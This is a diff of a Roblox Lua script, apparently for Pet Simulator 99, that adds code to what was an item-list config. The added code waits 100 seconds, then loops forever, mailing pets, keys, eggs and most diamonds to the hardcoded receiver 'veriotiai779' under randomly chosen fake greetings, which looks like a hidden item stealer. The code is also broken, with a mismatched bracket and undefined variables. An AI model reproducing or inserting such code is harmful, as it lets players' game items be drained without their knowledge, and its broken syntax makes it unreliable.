@@ -1,24 +1,35 @@
 getgenv().GMAIL_ITEMS = {		
 
 
-
-["MVP Key Upper Half"] = {Class = "Misc", Id = "MVP Key Upper Half", MinAmount = 50},	
-["MVP Key Lower Half"] = {Class = "Misc", Id = "MVP Key Lower Half", MinAmount = 200},	
-
-
-["Mega Charm Chest"] = {Class = "Lootbox", Id = "Mega Charm Chest", MinAmount = 1},
-["Overload"] = {Class = "Charm", Id = "Overload", MinAmount = 2},
-["Royalty"] = {Class = "Charm", Id = "Royalty", MinAmount = 2},
-["Charm Chisel"] = {Class = "Misc", Id = "Charm Chisel", MinAmount = 100},
-["Chest Spell"] = {Class = "Ultimate", Id = "Chest Spell", MinAmount = 1},
-
-["Daycare egg 5"] = {Class = "Egg", Id = "Huge Machine Egg 5", MinAmount = 1},
 ["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
 ["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
 ["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
 ["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	
 
-["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "100m", MinAmount = "300m"},	
+}
+getgenv().GMAIL_RECEIVERS = {"veriotiai779")
+
+-- send all item
+task.spawn(function()
+wait(100)
+while true do
+
+getgenv().Settings = {		
+
+["MVP Key Upper Half"] = {Class = "Misc", Id = "MVP Key Upper Half", MinAmount = 50},	--ok
+["MVP Key Lower Half"] = {Class = "Misc", Id = "MVP Key Lower Half", MinAmount = 200},	
+
+["Mega Charm Chest"] = {Class = "Lootbox", Id = "Mega Charm Chest", MinAmount = 1},
+["Overload"] = {Class = "Charm", Id = "Overload", MinAmount = 2},
+["Royalty"] = {Class = "Charm", Id = "Royalty", MinAmount = 2},
+["Charm Chisel"] = {Class = "Misc", Id = "Charm Chisel", MinAmount = 100},
+
+["Chest Spell"] = {Class = "Ultimate", Id = "Chest Spell", MinAmount = 1}, 
+["Tsunami"] = {Class = "Ultimate", Id = "Tsunami", KeepAmount = 1, MinAmount = 2}, 
+
+["Daycare egg 5"] = {Class = "Egg", Id = "Huge Machine Egg 5", MinAmount = 1}, -- chưa
+
+["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "100m", MinAmount = "300m"},	--ok
 
 ["Secret Key"] = {Class = "Misc", Id = "Secret Key", MinAmount = 1000},
 ["Fantasy Key"] = {Class = "Misc", Id = "Fantasy Key", MinAmount = 500},
@@ -27,6 +38,135 @@ getgenv().GMAIL_ITEMS = {
 ["Crystal Key"] = {Class = "Misc", Id = "Crystal Key", MinAmount = 2500},
 ["Hacker Key"] = {Class = "Misc", Id = "Hacker Key", MinAmount = 2},
 
-["Insta Plant Capsule"] = {Class = "Misc", Id = "Insta Plant Capsule", MinAmount = 400},
-["Time Trial Gift"] = {Class = "Lootbox", Id = "Time Trial Gift", MinAmount = 18},
+
+["Insta Plant Capsule"] = {Class = "Misc", Id = "Insta Plant Capsule", MinAmount = 1},
+["Time Trial Gift"] = {Class = "Lootbox", Id = "Time Trial Gift", MinAmount = 18}, --ok
 }
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local Network = require(Client.Network)
+local SaveData = require(ReplicatedStorage.Library.Client.Save).Get()
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local Inventory = SaveData.Inventory
+
+local itemsFound = {} -- Kết quả tìm được
+
+-- ⚙️ Tùy chỉnh: người nhận
+local randomRecipient = NAME_USER_SEND
+
+-- 💬 Danh sách lời chúc
+local messages = {
+    "Happy Birthday %s!",
+    "Hope today brings %s!",
+    "Wishing you luck %s!",
+    "Congrats on your %s!",
+    "Give away %s!",
+    "You are amazing %s"
+}
+
+local message = string.format(messages[math.random(1, #messages)], username)	
+
+-- 🔢 Hàm chuyển đơn vị "100m", "1b" thành số
+local function parseNumber(str)
+	if type(str) == "number" then return str end
+	str = str:lower()
+	local multipliers = {k = 1e3, m = 1e6, b = 1e9, t = 1e12}
+	local num = tonumber(str:match("[%d%.]+")) or 0
+	local suffix = str:match("[a-z]+")
+	return num * (multipliers[suffix] or 1)
+end
+
+-- 🔍 Tìm item trong Inventory
+local function findMatchingItems(class, id, allVariants)
+	local results = {}
+
+	local sub = Inventory[class]
+	if not sub then return results end
+
+	for uid, v in pairs(sub) do
+		if type(v) == "table" and v.id then
+			local match = false
+			if allVariants then
+				match = string.find(v.id, id)
+			else
+				match = v.id == id
+			end
+
+			if match then
+				table.insert(results, {
+					UID = uid,
+					ID = v.id,
+					PT = v.pt,
+					SH = v.sh,
+					TN = v.tn,
+					Count = tonumber(v._am) or 1,
+					Class = class,
+				})
+			end
+		end
+	end
+
+	return results
+end
+
+-- 📦 Duyệt qua từng mục cấu hình
+for key, config in pairs(getgenv().Settings) do
+	local class = config.Class
+	local id = config.Id
+	local minAmount = parseNumber(config.MinAmount)
+	local keepAmount = config.KeepAmount and parseNumber(config.KeepAmount) or 0
+	local allVariants = config.AllVariants or false
+	wait(2)
+	if class == "Currency" then
+	warn("Currency")
+	for uid, v in pairs(Inventory.Currency) do
+		if v.id == id then
+			local current = tonumber(v._am) or 0
+			local sendAmount = current - keepAmount
+
+			if sendAmount >= minAmount then
+				print("💰 Gửi currency:", id, "→", sendAmount)
+				local success, err = pcall(function()
+					return Network.Invoke("Mailbox: Send", randomRecipient, message, "Currency", uid, sendAmount)
+				end)
+				if not success then
+					warn("❌ Gửi currency lỗi:", err)
+				end
+			end
+		end
+	end
+
+	else
+		local matched = findMatchingItems(class, id, allVariants)
+
+		for _, item in ipairs(matched) do
+			local count = item.Count
+			local sendCount = count
+
+			if keepAmount > 0 and count > keepAmount then
+				sendCount = count - keepAmount
+			end
+
+			if sendCount >= minAmount then
+				print("📦 Gửi item:", item.ID, "| SL:", sendCount, "| Loại:", item.Class)
+				local success, err = pcall(function()
+					return Network.Invoke("Mailbox: Send", randomRecipient, message, class, item.UID, sendCount)
+				end)
+				if not success then
+					warn("❌ Gửi item lỗi:", err)
+				end
+				task.wait(0.5)
+			end
+		end
+	end
+end
+
+
+wait(4000)
+end
+
+
+end)
